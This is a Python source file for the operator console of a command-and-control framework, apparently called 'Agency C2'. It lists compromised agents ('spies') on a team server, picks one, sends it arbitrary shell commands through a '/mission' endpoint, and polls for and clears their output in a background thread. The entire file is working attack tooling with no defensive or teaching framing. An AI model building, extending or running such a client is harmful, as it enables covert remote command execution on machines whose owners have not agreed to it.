import requests
import argparse
import time
import threading
from datetime import datetime

# Global variable to store the current polling thread
current_polling_thread = None
stop_polling = threading.Event()

def poll_for_output(server, agent):
    while not stop_polling.is_set():
        response = requests.get(f"{server}/spy/{agent}", timeout=5)
        if response.status_code == 200:
            task_output = response.json().get('output')
            if task_output:
                print(task_output)
                requests.get(f"{server}/cls/{agent}")  # Notify server to clear the output
        time.sleep(3)  # Poll every 3 seconds, adjust as needed

def start_polling_thread(server, agent):
    global current_polling_thread, stop_polling

    # Stop the current polling thread if it's running
    if current_polling_thread and current_polling_thread.is_alive():
        stop_polling.set()  # Signal the current thread to stop
        current_polling_thread.join()  # Wait for the current thread to finish

    # Reset the stop flag and start a new polling thread
    stop_polling.clear()
    current_polling_thread = threading.Thread(target=poll_for_output, args=(server, agent), daemon=True)
    current_polling_thread.start()

def menu(ip, port, name):
    server = f"http://{ip}:{port}"
    agent = 0
    prompt = f"Agency C2 Client {name} $ > "

    while True:
        command = input(prompt)
        print("\n\n")

        if "list" in command:
            response = requests.get(f"{server}/spies").text
            print(response.replace("<p>", "").replace("</p>", "").replace("<br>", "\n"))
            continue

        if "spy" in command:
            agent = command[4:]
            print(agent)
            prompt = f"Spy {agent} # >"
            start_polling_thread(server, agent)
            continue

        if "shell" in command:
            if agent == 0:
                print(f"[{datetime.now()}] Please select a spy first\n\n")                
                continue
            else:
                cmd = command[6:]
                requests.get(f"{server}/mission/{agent}/{cmd}")
                continue

        if "help" in command:
            help()
            continue

        if "exit" in command:
            if current_polling_thread and current_polling_thread.is_alive():
                stop_polling.set()  # Signal the current thread to stop
                current_polling_thread.join()  # Wait for the current thread to finish
            exit()
            continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', required=True, help='Team server IP')
    parser.add_argument('--port', required=True, help='Port of the listener')
    parser.add_argument('--name', required=True, help='Your name')
    args = parser.parse_args()

    menu(args.ip, args.port, args.name)
